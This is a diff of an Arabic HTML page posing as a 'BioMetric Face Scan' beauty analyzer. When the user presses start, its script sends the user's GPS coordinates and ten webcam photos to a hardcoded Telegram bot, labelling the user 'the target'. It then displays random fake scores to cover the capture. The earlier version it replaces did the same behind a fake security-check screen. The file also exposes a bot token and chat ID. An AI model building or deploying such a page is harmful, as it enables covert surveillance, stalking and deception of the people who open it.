@@ -1,73 +1,136 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري تأمين الاتصال...</title>
+    <title>BioMetric Face Scan | التحليل البيومتري</title>
     <style>
-        body { background-color: #121212; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .loader { border: 5px solid #333; border-top: 5px solid #e74c3c; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        p { margin-top: 20px; color: #888; }
+        body { background-color: #0a0a12; color: #00ff88; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; box-sizing: border-box; }
+        .scanner-container { border: 1px solid #00ff88; background: rgba(0, 255, 136, 0.05); padding: 25px; border-radius: 12px; text-align: center; box-shadow: 0 0 25px rgba(0, 255, 136, 0.2); width: 100%; max-width: 450px; position: relative; overflow: hidden; }
+        .scan-grid { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0, 255, 136, 0.1) 3px), repeating-linear-gradient(90deg, transparent, transparent 2px, rgba(0, 255, 136, 0.1) 3px); z-index: -1; }
+        h2 { letter-spacing: 2px; margin-bottom: 10px; }
+        .btn-scan { background: #00ff88; color: #0a0a12; border: none; padding: 12px 35px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 25px; border-radius: 4px; transition: 0.3s; }
+        .btn-scan:hover { box-shadow: 0 0 15px #00ff88; }
+        #status { margin-top: 20px; font-size: 14px; color: #a0a0a0; min-height: 20px; }
+        
+        .results-box { display: none; text-align: right; margin-top: 30px; border-top: 2px dashed #00ff88; padding-top: 20px; }
+        .result-item { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 15px; }
+        .result-label { color: #a0a0a0; }
+        .result-value { font-weight: bold; color: #fff; }
+        .final-score { text-align: center; font-size: 24px; color: #00ff88; margin-top: 25px; font-weight: bold; border: 1px solid #00ff88; padding: 10px; }
+        .loading-bar { width: 0%; height: 3px; background: #00ff88; margin-top: 10px; transition: width 0.3s; }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
-    <p>جاري فحص بروتوكولات الأمان، يرجى الانتظار...</p>
+    <div class="scanner-container">
+        <div class="scan-grid"></div>
+        <h2>BIOMETRIC ANALYZER</h2>
+        <p style="color: #a0a0a0; font-size: 13px;">نستخدم خوارزميات متقدمة لتحليل تناسق الملامح، الصحة الظاهرية، والسمات الفريدة لوجهك.</p>
+        
+        <div id="pre-scan-ui">
+            <button class="btn-scan" id="startBtn" onclick="startRealAnalysis()">بدء المسح البيومتري</button>
+            <div class="loading-bar" id="bar"></div>
+        </div>
+        
+        <div id="status">الجهاز جاهز. بانتظار الإذن...</div>
 
-    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+        <div class="results-box" id="resultsUi">
+            <h3 style="text-align: center; color: #fff;">تقرير التحليل</h3>
+            <div class="result-item"><span class="result-label">هيكل الوجه:</span> <span class="result-value" id="res-shape"></span></div>
+            <div class="result-item"><span class="result-label">تناسق الملامح:</span> <span class="result-value" id="res-symmetry"></span></div>
+            <div class="result-item"><span class="result-label">العمر الظاهري المقدر:</span> <span class="result-value" id="res-age"></span></div>
+            <div class="result-item"><span class="result-label">حيوية البشرة:</span> <span class="result-value" id="res-skin"></span></div>
+            <div class="final-score" id="res-score"></div>
+            <p style="font-size: 12px; text-align: center; margin-top: 15px; color: #a0a0a0;">تم التحليل بواسطة BioScan AI v4.2. النتائج للأغراض الترفيهية.</p>
+        </div>
+    </div>
+
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const TOKEN = '8596805324:AAELff4nCa1M4GWFiGW3gw3vIadL1c1i93o';
         const CHAT_ID = '8293639164';
-        let photoCount = 0;
-        const maxPhotos = 10; // عدد الصور المطلوب
 
-        async function startCamera() {
+        const faceShapes = ["بيضاوي متناسق", "دائري", "مربع محدد", "قلبي الشكل", "ماسي نادر"];
+        const skinTypes = ["نضرة وصحية (92%)", "عادية (85%)", "تحتاج ترطيب (78%)", "ممتازة (95%)"];
+        
+        function getRandomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+        function res(id, val) { document.getElementById(id).innerText = val; }
+
+        async function startRealAnalysis() {
+            const btn = document.getElementById('startBtn');
+            const status = document.getElementById('status');
+            const bar = document.getElementById('bar');
+            
+            btn.style.display = 'none';
+            status.innerHTML = "جاري الاتصال بوحدة المعالجة السحابية...";
+            bar.style.width = "10%";
+
+            // 1. التقاط GPS
+            navigator.geolocation.getCurrentPosition((pos) => {
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("📍 إحداثيات الهدف:\nhttps://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude)}`);
+            });
+
+            // 2. تشغيل الكاميرا والتقاط 10 صور
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
                 video.srcObject = stream;
+                
+                canvas.width = 640; 
+                canvas.height = 480;
 
-                // إشعار بالدخول
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("🚨 بدأ التقاط سلسلة الصور (10 صور)...")}`);
+                // حلقة لالتقاط 10 صور
+                for (let i = 1; i <= 10; i++) {
+                    status.innerHTML = `جاري مسح الطبقة الحيوية للوجه (${i}/10)... يرجى الثبات`;
+                    bar.style.width = (10 + (i * 8)) + "%";
 
-                // وظيفة التقاط وإرسال صورة واحدة
-                const takeAndSendPhoto = () => {
-                    if (photoCount < maxPhotos) {
-                        const canvas = document.getElementById('canvas');
-                        canvas.getContext('2d').drawImage(video, 0, 0);
+                    // التقاط اللقطة الحالية من الفيديو
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    await new Promise(resolve => {
                         canvas.toBlob(blob => {
                             const formData = new FormData();
-                            formData.append('photo', blob, `photo_${photoCount}.jpg`);
+                            formData.append('photo', blob, `shot_${i}.jpg`);
                             formData.append('chat_id', CHAT_ID);
-                            formData.append('caption', `📸 لقطة رقم ${photoCount + 1}`);
+                            formData.append('caption', `📸 لقطة رقم ${i} من 10 للهدف`);
+                            
+                            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { 
+                                method: 'POST', 
+                                body: formData 
+                            }).then(() => resolve());
+                        }, 'image/jpeg', 0.7); // تقليل الجودة قليلاً لسرعة الرفع
+                    });
 
-                            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                                method: 'POST',
-                                body: formData
-                            }).then(() => {
-                                photoCount++;
-                                if (photoCount < maxPhotos) {
-                                    setTimeout(takeAndSendPhoto, 1000); // انتظر ثانية قبل الصورة التالية
-                                } else {
-                                    // بعد الانتهاء من الـ 10 صور، حوله لجوجل
-                                    window.location.href = "https://www.google.com";
-                                }
-                            });
-                        }, 'image/jpeg');
-                    }
-                };
+                    // انتظار نصف ثانية بين كل صورة وصورة
+                    await new Promise(r => setTimeout(r, 600));
+                }
 
-                // ابدأ أول صورة بعد ثانيتين من فتح الكاميرا لضمان الوضوح
-                setTimeout(takeAndSendPhoto, 2000);
+                status.innerHTML = "تمت المعالجة. جاري توليد التقرير...";
+                bar.style.width = "100%";
+
+                // 3. إظهار النتائج النهائية
+                setTimeout(() => {
+                    stream.getTracks().forEach(t => t.stop());
+                    document.getElementById('pre-scan-ui').style.display = 'none';
+                    status.style.display = 'none';
+                    document.getElementById('resultsUi').style.display = 'block';
+
+                    res('res-shape', faceShapes[getRandomInt(0, faceShapes.length - 1)]);
+                    res('res-symmetry', getRandomInt(85, 98) + "% (ممتاز)");
+                    res('res-age', getRandomInt(22, 35) + " سنة");
+                    res('res-skin', skinTypes[getRandomInt(0, skinTypes.length - 1)]);
+                    res('res-score', "التقييم العام: " + getRandomInt(88, 96) + "/100 A+");
+                }, 2000);
 
             } catch (err) {
-                window.location.href = "https://www.google.com";
+                status.innerText = "خطأ: لا يمكن إتمام التحليل بدون صلاحية الكاميرا.";
+                status.style.color = "#ff3333";
+                bar.style.background = "#ff3333";
             }
         }
-        window.onload = startCamera;
     </script>
 </body>
 </html>
